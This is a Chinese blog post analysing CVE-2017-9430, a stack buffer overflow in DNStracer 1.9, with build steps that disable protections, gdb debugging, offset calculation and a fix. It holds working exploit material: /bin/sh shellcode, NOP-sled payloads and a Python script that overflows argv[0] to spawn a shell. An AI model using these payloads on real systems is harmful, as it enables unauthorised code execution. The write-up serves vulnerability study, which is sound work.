---
layout:     post
title:      CVE-2017-9430-DNStracer缓冲区溢出漏洞调试分析
subtitle:   漏洞复现
date:       2020-08-11
author:     Jie_Y
header-img: img/post-bg-vulnerability.jpg
catalog: true
tags:
    - 漏洞逆向
    - 二进制
---

# CVE-2017-9430 DNStracer缓冲区溢出漏洞调试分析

概述：CVE-2017-9430是一个经典的缓冲区溢出漏洞，主要涉及`DNStracer`软件，其在进行字符串拷贝时未检查字符串的长度导致缓冲区溢出，下面进行漏洞复现和原理分析。

## 1 漏洞描述

`DNStracer`是一个`DNS`解析过程的跟踪器。`dnstracer1.9`中基于堆栈的缓冲区溢出使攻击者可以通过带有`long name`参数的命令行在`argv[0]`的`strcpy`调用中处理不当而导致拒绝服务（应用程序崩溃）或可能造成未指定的其他影响。一个示例威胁模型是一个`Web`应用程序，该应用程序使用不受信任的名称字符串启动`dnstracer`。

漏洞公开：<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9430>

## 2 漏洞复现

### 2.1 调试环境

操作系统：`VM Ubuntu 12.04.5 32`位(由于64位和32位体系结构不同，刚开始我用64位进行测试，在进行反汇编时导致代码理解起来非常费劲，因此改用32位系统)

![cve-2017-9430-1.png](https://i.loli.net/2020/08/11/EHAkV5lwp6DjRTg.png)

对象版本：`DNStracer v1.9`

调试器： `gdb-peda`

### 2.2 复现结果

运行命令：
```bash
$ dnstracer -v $(python -c 'print "A"*1025')
```
![cve-2017-9430-2.png](https://i.loli.net/2020/08/11/5cyWnMxJUoAPbQi.png)

## 3 漏洞分析

### 3.1 配置环境

#### 3.1.1 `DNStracer v1.9`编译安装

首先下载`DNStracer`，可以从官网(http://www.mavetju.org/download/)下载也可以利用`wget`下载。
```bash
$ wget <http://www.mavetju.org/download/dnstracer-1.9.tar.gz>
```
![cve-2017-9430-3.png](https://i.loli.net/2020/08/11/KTVNg19tkYbXmrB.png)

下载完成后解压缩：
```bash
$ tar zxvf dnstracer-1.9.tar.gz
```
![cve-2017-9430-4.png](https://i.loli.net/2020/08/11/LV4YdyFKia8POgM.png)

切换到`DNStracer`目录
```bash
$ cd dnstracer-1.9
```
![cve-2017-9430-5.png](https://i.loli.net/2020/08/11/Zq7YFvozGRsp6jf.png)

然后编译安装
```bash
$ ./configure
```
![cve-2017-9430-6.png](https://i.loli.net/2020/08/11/oiu3KHdkSavB8fX.png)

由于是研究栈溢出，所以需要关闭一些防护机制，调整一些默认的`mitigation`选项。在`./configure`之后生成`makefile`文件里修改`&CFLAGS`编译选项。
```bash
CFLAGS = -g -O2 -fno-stack-protector -Wl,-zexecstack -D_FORTIFY_SOURCE=0
```
另外高版本`GCC`会有一些问题，程序入口的汇编代码不是`push ebp; mov edp,esp`等，而是`lea …and …`等，因此还需要在`CFLAGS`中加入：
```bash
CFLAGS = -g -O2 -fno-stack-protector -Wl,-zexecstack -D_FORTIFY_SOURCE=0
-mpreferred-stack-boundary=2
```
![cve-2017-9430-7.png](https://i.loli.net/2020/08/11/2nHZStGbRdOwIBc.png)

其中`-g -O2`是自带的，表示调试信息和2级优化。后面的这三个分别表示禁用`Stack canary`、关闭`NX`以及关闭源码增强。此外，最好关闭`ASLR`，需要用`root`账户操作：
```bash
# echo 0 > /proc/sys/kernel/randomize_va_space
```
然后进行编译
```bash
$ make
```
![cve-2017-9430-8.png](https://i.loli.net/2020/08/11/Dj51drCvWJzbUlo.png)
```bash
$ sudo make install
```
![cve-2017-9430-9.png](https://i.loli.net/2020/08/11/Wg9ZVslNwHjidOb.png)

然后测试一下是否安装成功

![cve-2017-9430-10.png](https://i.loli.net/2020/08/11/ksruyETRmDMIQWz.png)

安装成功！！

#### 3.1.2 调试器`gdb-peda`安装

`peda`是`gdb`的一个插件，安装后大大提升`gdb`在分析逆向/溢出程序时的用户体验。安装`peda`首先需要`python2`环境，`Ubuntu`系统自带`python`环境，但是12.04版本没有`python-pip`包，因此需要首先进行安装
```bash
$ sudo apt-get install python-pip
```
但是无法使用pip直接安装peda，使用sudo pip install
peda这个命令直接安装peda在高版本的gdb中会有问题。

因此安装peda需要用git从github下载源码进行安装。
```bash
$ sudo apt-get install git
```
然后进行安装
```bash
$ git clone https://github.com/longld/peda.git ~/peda
$ echo "source ~/peda/peda.py" >> ~/.gdbinit
$ echo "DONE! debug your program with gdb and enjoy"
```
可以输入gdb进行测试，此时已经可以看到peda显示

![cve-2017-9430-11.png](https://i.loli.net/2020/08/11/1F8t3xp4jLShMPb.png)

检查一下安全选项：

![cve-2017-9430-12.png](https://i.loli.net/2020/08/11/L642aKtxMG7CPfE.png)

### 3.2 源代码静态分析

由于可以直接获取源代码，首先进行静态分析，通过网上爆出的漏洞资料可知漏洞的位置位于main函数内，分析源代码，

```c
int
main(int argc, char **argv)
{
int ch;
char * server_name = "127.0.0.1";
char * server_ip = "0000:0000:0000:0000:0000:0000:0000:0000";
char ipaddress[NS_MAXDNAME];
char argv0[NS_MAXDNAME];
int server_root = 0;
int ipv6 = 0;
……
……
……
// argc和argv skip过上面处理的参数
argc -= optind;
argv += optind;
// 此时argv[0]就是以上参数其后的第一个参数
if (argv[0] == NULL) usage();
// check for a trailing dot
// 这里没有对argv[0]的长度进行检查，直接拷贝到了局部数组变量argv0
strcpy(argv0, argv[0]);
if (argv0[strlen(argv[0]) - 1] == '.') argv0[strlen(argv[0]) - 1] = 0;
printf("Tracing to %s[%s] via %s, maximum of %d retries\n",
argv0, rr_types[global_querytype], server_name, global_retries);
srandom(time(NULL));
{
struct hostent *h = NULL;
……
create_session(argv0, ipaddress, ipv6, server_name,
server_root == 0 ? NULL : ".", 0, "", 1);
printf("\n");
if (global_overview != 0) {
printf("\n");
display_arecords();
}
return 0;
}
```

可知在strcpy函数处可能存在拷贝的字符串argv[0]\>argv0的情况，搜索一下NS_MAXDNAME的长度：
```bash
$ grep -nr "NS_MAXDNAME"
dnstracer_broken.h:58:#ifndef NS_MAXDNAME
dnstracer_broken.h:59:#define NS_MAXDNAME 1024
```
![cve-2017-9430-13.png](https://i.loli.net/2020/08/11/QzZ9WL6hSOFmabH.png)

得到argv0的大小为1024，如果当argv[0]的大小超过1024，就会覆盖ebp和返回地址，造成缓冲区溢出。

### 3.3 动态调试

用gdb调试DNStracer，首先反汇编main函数：

![cve-2017-9430-14.png](https://i.loli.net/2020/08/11/GhnWXzKcUYxHdoE.png)

可以看出main函数的开始符合正常汇编代码，分析起来较为方便。

在main函数入口处设置一个断点：

![cve-2017-9430-15.png](https://i.loli.net/2020/08/11/dgcKbxGetAN3j1k.png)

然后运行程序查看中断位置：

![cve-2017-9430-16.png](https://i.loli.net/2020/08/11/QnPwSdt5uEXvOkG.png)

然后把DNStracer程序通过IDA　pro找到argv0为-411h

![cve-2017-9430-17.png](https://i.loli.net/2020/08/11/asOxyW8JnGcIfEU.png)

计算可知为1041，其是argv0距esp的大小，也就是距离返回地址的偏移，因此设置参数：
```bash
set args $(python -c ‘print “A”*1041+“B”*4’)
```
然后运行程序：

![cve-2017-9430-18.png](https://i.loli.net/2020/08/11/Z9quMbt6JLNDas5.png)

因为有断点，程序会中断，删除断点继续运行。

![cve-2017-9430-19.png](https://i.loli.net/2020/08/11/ZyA6TVYelxC918a.png)

可以看到中断在了return地址0x42424242，也就是4个B的位置，查看一下栈帧esp的位置，而esp指向了0x00000000。

![cve-2017-9430-20.png](https://i.loli.net/2020/08/11/UDeWkR8L9wausEJ.png)

![cve-2017-9430-21.png](https://i.loli.net/2020/08/11/92oVNv8METCYhy4.png)

![cve-2017-9430-22.png](https://i.loli.net/2020/08/11/jWd5yZ7cYUaXxER.png)

由于上面删除了断点，并且程序中断，重新用gdb加载DNStracer设置断点并运行程序：

![cve-2017-9430-23.png](https://i.loli.net/2020/08/11/apqKomMl8W6VUZc.png)

然后使用vmmap查看使用的库等

![cve-2017-9430-24.png](https://i.loli.net/2020/08/11/sEOiUTzMpma1uWk.png)

利用jmpcall查看一下esp在libc-2.15.so的地址，随便找一个地址，例如第一个0xb7e22a55，因为涉及大端小端问题，把地址改写成’\\x55\\x2a\\xe2\\xb7’

![cve-2017-9430-25.png](https://i.loli.net/2020/08/11/tgaNlJIQ8fxRdF4.png)

然后设置参数，把esp的地址加到args参数里面，执行

![cve-2017-9430-26.png](https://i.loli.net/2020/08/11/sT3MVdF9JApnk2e.png)

继续执行，发现程序会中断到0xbfffef31，查看esp验证一下

![cve-2017-9430-27.png](https://i.loli.net/2020/08/11/t3cGuVEpYxF5Wod.png)

![cve-2017-9430-28.png](https://i.loli.net/2020/08/11/Ly4Uidp8DoaNJCj.png)

因为main的返回命令是ret，自己没有处理调用者传参的堆栈平衡，所以本次没有用于占位的0xcc字节。

然后编写shellcode，这里利用参考文章中给出的：
```bash
shellcode =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```
所以payload：
```python
python -c 'print "A"*1041 + "\x55\x2a\xe2\xb7" +
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'
```
运行结果：

![cve-2017-9430-29.png](https://i.loli.net/2020/08/11/zb173qhZ4dn9RvA.png)

上面运行出错，这是由于payload写错导致。

因为shellcode长度为25字节，改用覆盖ebp的方式，因此前面用nop填充：

![cve-2017-9430-30.png](https://i.loli.net/2020/08/11/B5pgjviEwCI4mYx.png)
```bash
set args $(python -c 'print
"\x90"*1016+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x1b\xeb\xff\xbf"')
```
![cve-2017-9430-31.png](https://i.loli.net/2020/08/11/9t6f3RVhzvaICyJ.png)

![cve-2017-9430-32.png](https://i.loli.net/2020/08/11/BWZudzwTpa3A9DH.png)

![cve-2017-9430-33.png](https://i.loli.net/2020/08/11/8qzKal5GSCVsRjn.png)

但是程序发生了错误，通过设置断点发现错误发生在0xbfffef23，而shellcode位于0xbfffef13，两者相差16个字节：

所以这里采用的解决办法是去掉前面的16个nop，将其加到 shellcode 后面。

![cve-2017-9430-34.png](https://i.loli.net/2020/08/11/tNiJrLYyeQP4Ugv.png)
```bash
set args $(python -c 'print
"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*16+"\x1b\xeb\xff\xbf"')
```
重新执行一遍：

![cve-2017-9430-35.png](https://i.loli.net/2020/08/11/sUzTRyqeboE9mXC.png)

成功获得shell：

![cve-2017-9430-36.png](https://i.loli.net/2020/08/11/YM16Hh3kuyI8tDW.png)

所以可以编写shellcode：
```python
import os
from subprocess import call

def exp():
   filling = "A"*1041
   jmp_esp = "\x55\x2a\xe2\xb7" //自己更改esp的地址
   shellcode =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
   payload = filling + jmp_esp + shellcode
   call(["dnstracer", payload])

if __name__ == '__main__':
   try:
       exp()
   except Exception as e:
       print "Something went wrong"
```
再次验证即可。

## 4 漏洞修复

要修补这个漏洞的话，只需要在strcpy()函数前加上对参数长度的检查就可以了：
```c
   /*CVE-2017-9430 Fix*/  
   if(strlen(argv[0]) >= NS_MAXDNAME)  
  {  
       free(server_ip);  
       free(server_name);  
       fprintf(stderr, "dnstracer: argument is too long %s\n", argv[0]);  
       return 1;  
  }  

   // check for a trailing dot  
   strcpy(argv0, argv[0]);
```

## 5 总结

栈溢出漏洞相对来说比较简单，CVE-2017-9430主要涉及strcpy()函数拷贝溢出问题，我们可以通过覆盖返回地址、esp、ebp的方式使程序跳转到shellcode中执行，造成一些严重的系统问题。从中我们可以学习到栈溢出的原理掌握分析方法，并且学习到shellcode编写的一些方法。

## 6 参考

1、<https://www.freebuf.com/column/163101.html>

2、<https://www.dazhuanlan.com/2019/08/21/5d5d14760b737/>
